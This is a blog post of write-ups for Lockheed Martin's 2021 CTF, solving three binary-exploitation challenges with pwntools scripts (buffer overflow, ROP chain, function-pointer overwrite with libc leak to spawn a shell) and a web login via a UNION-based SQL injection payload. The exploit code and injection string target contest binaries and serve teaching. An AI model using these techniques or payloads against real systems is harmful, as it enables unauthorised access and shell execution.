---
layout: post
title: "LM Cyber CTF Writeups For PWN And Web Challenges"
date: 2021-1-9
---

Recently, I played in Lockheed Martin's 2021 CTF challenge, and my team, nullbytes, got first place. I mainly worked on the PWN and web exploitation challenges for my team, so here are my solutions for all the problems in those two categories.

### Cereal Creator

The first PWN challenge can be downloaded [here](../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn100). This is a program that allows the user to "eat cereal."
```sh
$ ./pwn100
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
1
What kind of cereal would you like to add to your bowl?
AAAAAAAAAAAAAA
adding cereal into your bowl
added cereal to bowl
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
2
pooring milk ...
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
3
eating our bowl
Bowl, AAAAAAAAAAAAAA with milk, was a great bowl of cereal
```

The binary has NX enabled, meaning that we cannot inject shellcode into the stack and execute it.
```sh
gef➤  checksec
[+] checksec for '/home/nihaal/Desktop/LMCTF/pwn100'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

I played around with some of the input parameters, and I eventually found out that the program crashed if you eat something with a cereal flavor that has a long string. Using this crash, I created a Python script that overwrites `RIP` with a bunch of Bs.

```python
#!/usr/bin/env python3
from pwn import *

p = process("./pwn100")
gdb.attach(p, "b *do_main+189\nc")

p.sendline("1")
payload = ""
for x in range(0, 316):
    payload += chr(x % 256)
payload = payload.encode('UTF-8')
payload += b"BBBBBBBB"
p.sendline(payload)

p.sendline("3")
p.interactive()
```

Running this code would produce the following GDB prompt. As you can see, the saved `RIP` value on the stack has been overwritten with a bunch of Bs. This means that we can jump to any function that we want.
```sh
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x64
$rsp   : 0x00007ffcd7ad8d68  →  "BBBBBBBB"
$rbp   : 0x3b3a393837363534 ("456789:;"?)
$rsi   : 0x0
$rdi   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
$rip   : 0x0000000000400a99  →  <do_main+189> ret
$r8    : 0xffffffff
$r9    : 0x9d
$r10   : 0xfffffffffffff28e
$r11   : 0x00007f0b0190ee70  →  <__memset_avx2_unaligned+0> vmovd xmm0, esi
$r12   : 0x0000000000400710  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcd7ad8d68│+0x0000: "BBBBBBBB"   ← $rsp
0x00007ffcd7ad8d70│+0x0008: 0x00007ffcd7ad8e00  →  0x0000000000000000
0x00007ffcd7ad8d78│+0x0010: 0x0000000100000000
0x00007ffcd7ad8d80│+0x0018: 0x0000000000400ae0  →  <__libc_csu_init+0> push r15
0x00007ffcd7ad8d88│+0x0020: 0x00007f0b017d2d0a  →  <__libc_start_main+234> mov edi, eax
0x00007ffcd7ad8d90│+0x0028: 0x00007ffcd7ad8e78  →  0x00007ffcd7ada464  →  "./pwn100"
0x00007ffcd7ad8d98│+0x0030: 0x0000000100000000
0x00007ffcd7ad8da0│+0x0038: 0x0000000000400a9a  →  <main+0> push rbp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a91 <do_main+181>    jne    0x400a02 <do_main+38>
     0x400a97 <do_main+187>    nop
     0x400a98 <do_main+188>    leave
 →   0x400a99 <do_main+189>    ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn100", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a99 → do_main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7ffcd7ad8d68:
 rip = 0x400a99 in do_main; saved rip = 0x4242424242424242
 called by frame at 0x7ffcd7ad8d78
 Arglist at 0x3b3a393837363534, args:
 Locals at 0x3b3a393837363534, Previous frame's sp is 0x7ffcd7ad8d70
 Saved registers:
  rip at 0x7ffcd7ad8d68
```

Unfortunately, I did not have control over more than eight bytes on the stack. If I tried to use a ROP chain with more than one gadget, it would only execute the first gadget and ignore all the others. This meant that I had to find a single function that would produce a shell for me. I looked around at what functions were inside of the binary, and I saw a function named `custom_features`. This function executes `execve("/bin/sh")`, which is exactly what I needed.

```sh
gef➤  info functions custom_features
All functions matching regular expression "custom_features":

Non-debugging symbols:
0x00000000004007f7  custom_features
gef➤  disas custom_features
Dump of assembler code for function custom_features:
   0x00000000004007f7 <+0>:     push   rbp
   0x00000000004007f8 <+1>:     mov    rbp,rsp
   0x00000000004007fb <+4>:     sub    rsp,0x10
   0x00000000004007ff <+8>:     lea    rax,[rip+0x362]        # 0x400b68
   0x0000000000400806 <+15>:    mov    QWORD PTR [rbp-0x10],rax
   0x000000000040080a <+19>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400812 <+27>:    lea    rax,[rbp-0x10]
   0x0000000000400816 <+31>:    mov    edx,0x0
   0x000000000040081b <+36>:    mov    rsi,rax
   0x000000000040081e <+39>:    lea    rdi,[rip+0x343]        # 0x400b68
   0x0000000000400825 <+46>:    call   0x4006c0 <execve@plt>
   0x000000000040082a <+51>:    nop
   0x000000000040082b <+52>:    leave
   0x000000000040082c <+53>:    ret
End of assembler dump.
gef➤  x/s 0x400b68
0x400b68:       "/bin/sh"
```

All I had to do now to get a shell was to replace the Bs in my script with the address `0x4007f7`. Running this script would give me a shell.
```python
#!/usr/bin/env python3
from pwn import *

p = process("./pwn100")
gdb.attach(p, "b *do_main+189\nc")
# p = remote("challenges.ctfd.io", 30429)

p.sendline("1")
payload = ""
for x in range(0, 316):
    payload += chr(x % 256)
payload = payload.encode('UTF-8')
payload += p64(0x4007f7)
p.sendline(payload)

p.sendline("3")
p.interactive()
```

### Cereal Creator 2
This binary, which you can download [here](../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn200), was very similar to the last one, and it also had the NX bit enabled.

```sh
$ ./pwn200
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
1
get ready to add some cereal!!

current buf: BowlWhat kind of cereal would you like to add to your bowl?
AAAAAAAAAAAAAAAAAAAAAAAAAA
adding cereal into your bowl
added cereal to bowl
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
2
pooring milk ...
[1] Add Cereal flavor
[2] Add milk
[3] Eat
[4] exit
3
eating our bowl
Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAA with milk, was a great bowl of cereal
```

Once again, I found out that sending a long enough string to the cereal flavor input would cause the program to crash when you eat it. Although, this time the offset was slightly different.

```python
#!/usr/bin/env python3
from pwn import *

p = process("./pwn200")
gdb.attach(p, "c")

p.sendline("1")
payload = b"A"*120
payload += b"BBBBBBBB"
payload += b"CCCCCCCC"
payload += b"DDDDDDDD"
p.sendline(payload)

p.sendline("3")
p.interactive()
```

As you can see from GDB below, not only was I able to overwrite `RIP` with this script, but this time, I was also able to write more data to the stack. This means that ROP chains can be used for this attack.
```sh
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x15
$rbx   : 0x0
$rcx   : 0x00007f08250e7ed3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007ffe92638b18  →  "BBBBBBBBCCCCCCCCDDDDDDDD"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f08251b8723  →  0x1ba670000000000a
$rdi   : 0x00007f08251ba670  →  0x0000000000000000
$rip   : 0x0000000000400981  →  <add_cereal+162> ret
$r8    : 0x15
$r9    : 0x00007ffe92638c10  →  "Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r10   : 0x1b
$r11   : 0x246
$r12   : 0x0000000000400750  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe92638b18│+0x0000: "BBBBBBBBCCCCCCCCDDDDDDDD"   ← $rsp
0x00007ffe92638b20│+0x0008: "CCCCCCCCDDDDDDDD"
0x00007ffe92638b28│+0x0010: "DDDDDDDD"
0x00007ffe92638b30│+0x0018: 0x000000006c770000
0x00007ffe92638b38│+0x0020: 0x35ca06701eb30600
0x00007ffe92638b40│+0x0028: 0x00007f08251b7980  →  0x00000000fbad2088
0x00007ffe92638b48│+0x0030: 0x00007f08251b94a0  →  0x0000000000000000
0x00007ffe92638b50│+0x0038: 0x0000000000400750  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40097a <add_cereal+155> call   0x4006b0 <puts@plt>
     0x40097f <add_cereal+160> nop
     0x400980 <add_cereal+161> leave
 →   0x400981 <add_cereal+162> ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn200", stopped, reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400981 → add_cereal()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7ffe92638b18:
 rip = 0x400981 in add_cereal; saved rip = 0x4242424242424242
 called by frame at 0x7ffe92638b28
 Arglist at 0x4141414141414141, args:
 Locals at 0x4141414141414141, Previous frame's sp is 0x7ffe92638b20
 Saved registers:
  rip at 0x7ffe92638b18
```

I took a look at the `custom_feature` function inside of Ghidra's decompiler, and unlike in the previous binary, this function will only produce a shell if the first parameter is equal to `0xdeadbeef`. Note that `-0x21524111` is equal to `0xdeadbeef`.
```c
void custom_feature(int param_1)

{
  char *local_18;
  undefined8 local_10;

  if (param_1 == -0x21524111) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  else {
    puts("you are not authenticated to do this :<");
  }
  return;
}
```

In order to use the `custom_feature` function, I had to create a ROP chain that moves `0xdeadbeef` into RDI before calling `custom_feature`. To do this, I searched for a POP RDI instruction.
```sh
$ ropper --file pwn200 --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: pwn200
0x0000000000400be3: pop rdi; ret;
```

After that, I looked up the address of the `custom_feature` function.
```sh
gef➤  info functions custom_feature
All functions matching regular expression "custom_feature":

Non-debugging symbols:
0x0000000000400837  custom_feature
```

Now it's easy to construct a proper ROP chain using the Python code from earlier. Running the code below will give you a shell.
```python
#!/usr/bin/env python3
from pwn import *

p = process("./pwn200")
p.sendline("1")
payload = b"A"*120
payload += p64(0x400be3) # POP RDI
payload += p64(0xdeadbeef)
payload += p64(0x400837) # custom_feature()
p.send(payload)

p.sendline("3")
p.interactive()
```

### Name Tracker
You can download the binary [here](../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn300) and the library [here](../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/libc-2.31.so). This binary was a little bit tougher than the other two, even though it was worth the same amount of points. The program maintains an array of strings, and it allows you to input values into this array. The user can specify the index in the array where he/she wants to save the string.
```sh
$ ./pwn300
[1] add name
[2] print name
[3] exit
1
index: 0
pls give the name:
AAAAAAAAAAAAAAAAAAAAAA
[1] add name
[2] print name
[3] exit
2
index: 0
AAAAAAAAAAAAAAAAAAAAAA

[1] add name
[2] print name
[3] exit
3
```

When decompiling this program inside of Ghidra, you can see that the `main()` function first sets a function pointer to be equal to a pointer to `puts()`. This function pointer is placed right at the very end of the `names` array, which is supposed to contain all of the user's input values.
```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  names._10000_8_ = puts;
  do_main();
  return 0;
}
```

This function pointer is later used by the `print_name()` function, whose decompilation is shown below.
```c
void print_name(void)
{
  long in_FS_OFFSET;
  uint local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = 0;
  printf("index: ");
  __isoc99_scanf(&DAT_00400a95,&local_14);
  if (local_14 < 0x65) {
    (*names._10000_8_)(names + (ulong)local_14 * 100);
  }
  else {
    puts("index out of bounds no hacking");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

It is possible to overwrite this function pointer by writing data into the 100th index.
```sh
$ ./pwn300
[1] add name
[2] print name
[3] exit
1
index: 100
pls give the name:
A
[1] add name
[2] print name
[3] exit
2
index: 100
zsh: segmentation fault  ./pwn300
```

Another thing to note is that it is possible to print out the function pointer itself if it has been unmodified, thereby leaking the address of `puts()`. The unprintable characters shown below contain the address in hexadecimal.
```sh
$ ./pwn300                                                                                               127 ⨯
[1] add name
[2] print name
[3] exit
2
index: 100
���
[1] add name
[2] print name
[3] exit
3
```

We can open up the library in GDB to figure out the offset of `puts()` and the offset of `system()` from the base of libc.
```sh
$ gdb libc-2.31.so
GNU gdb (Debian 10.1-1.4) 10.1

[...]

gef➤  info functions puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x0000000000085e60  _IO_fputs
0x0000000000085e60  fputs
0x00000000000875a0  _IO_puts
0x00000000000875a0  puts
0x00000000000914a0  fputs_unlocked
0x00000000001273c0  putspent
0x0000000000129090  putsgent
gef➤  info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0x0000000000055410  __libc_system
0x0000000000055410  system
0x0000000000156a80  svcerr_systemerr
```

We can write some Python code to calculate the base of libc by subtracting `0x875a0` from the leaked address of `puts()`. Then we can calculate the address of `system()` by adding `0x55410` to that value.
```python
#!/usr/bin/env python3
from pwn import *

# Open the process
env = {"LD_PRELOAD": "./libc-2.31.so"}
p = process("./pwn300", env=env)
# gdb.attach(p, "b *print_name+143\nc\nc")

# Ignore first few lines
for x in range(0, 3):
    p.recvline()

# Leak the address of puts() and calculate offsets
p.sendline("2")
p.sendline("100")
puts_addr = p.recvline()[7:-1]
puts_addr = int(puts_addr[::-1].hex(), 16)
libc_addr = puts_addr - 0x875a0
system_addr = libc_addr + 0x55410
```

Now how do we pass in the input parameters? Using a ROP chain to POP the address of a `/bin/sh` string did not work when I tried it because only one address on the stack gets overwritten. Instead, if we look back at the line of code in Ghidra that executes the function pointer, we can see that the string inside of the buffer we're currently using is always going to be used as an input parameter for the program.

```c
(*names._10000_8_)(names + (ulong)local_14 * 100);
```

In other words, suppose we were to write "/bin/sh" into the 99th index of the array. Then we could use the "print name" option on the 99th index to call our function pointer, which should be overwritten with the address of `system()`. Since this line of code should use whatever we've written into the 99th index of the array, we will therefore be able to call `system("/bin/sh")` and get a shell!

Here is the code that does just that:
```python
#!/usr/bin/env python3
from pwn import *

# Open the process
env = {"LD_PRELOAD": "./libc-2.31.so"}
p = process("./pwn300", env=env)

# Ignore first few lines
for x in range(0, 3):
    p.recvline()

# Leak the address of puts() and calculate offsets
p.sendline("2")
p.sendline("100")
puts_addr = p.recvline()[7:-1]
puts_addr = int(puts_addr[::-1].hex(), 16)
libc_addr = puts_addr - 0x875a0
system_addr = libc_addr + 0x55410

# Set the function parameters
p.sendline("1")
p.sendline("99")
p.sendline("/bin/sh")

# Overwrite puts() pointer and execute
p.sendline("1")
p.sendline("100")
p.sendline(p64(system_addr))
p.sendline("2")
p.sendline("99")
p.interactive()
```

This will give the attacker a shell.

### Rookie Mistake
In this web challenge, we are presented with a basic login screen.

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake1.png" />

I tried typing in a double quotation mark character (") into the login prompt.

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake2.png" />

When I did this, I was presented with the text shown below, meaning that this is likely vulnerable to a SQL injection.

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake3.png" />

The organizers of the CTF also gave us the following hint for this challenge:

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake4.png" />

Based on this message, we know that the SQL query that gets sent through the `name` parameter is in the form:
```sql
select sha256pwdhash from login where username="{}".format(name)
```

What if we were to slightly modify this SQL query so that it would return a SHA256 hash that we type in? I looked up the SHA256 hash for the empty string, and it was `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`. With this knowledge, I wrote `"union select "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"--` into the `name` parameter. This meant that the entire SQL query would become
```sql
select sha256pwdhash from login where username=""union select "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"--"
```

In other words, I am adding the SHA256 hash for the empty string into the result for the SQL query.

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake5.png" />

The next page showed the following text.
<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake6.png" />

To login as administrator, I needed the `username` parameter of the SQL query to be equal to `administrator`. This meant that my SQL query had to look more like this:
```sql
select sha256pwdhash from login where username="administrator"union select "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"--"
```

The only change I made from the previous input was that I put the word "administrator" at the beginning of my SQL injection.

<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake7.png" />

On the next page, I received the flag.
<img style="margin-left: auto; margin-right: auto; width: 50%; height: 50%;" src="../../../assets/img/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/rookiemistake8.png" />


{% include related_posts.html %}
